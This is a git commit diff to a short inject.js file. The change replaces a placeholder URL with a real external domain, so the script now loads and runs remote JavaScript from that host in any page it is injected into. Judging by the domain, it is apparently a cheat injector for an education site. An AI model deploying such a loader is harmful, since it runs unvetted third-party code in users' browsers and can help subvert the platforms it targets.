54ed024a723f58bbead4703a5422769d787e01b0
Jealousy <67923032+JeaIousy@users.noreply.github.com>
2021-09-02 20:11:16 -0700

    Update inject.js
    :D

--- inject.js
+++ inject.js
@@ -1,4 +1,4 @@
 var script = document.createElement('script');
-script.setAttribute('src', 'http://yourdomian.com/your_script.js');
+script.setAttribute('src', 'https://ireadypog.tk/script.js');
 script.setAttribute('type', 'text/javascript');
 document.getElementsByTagName('head')[0].appendChild(script);
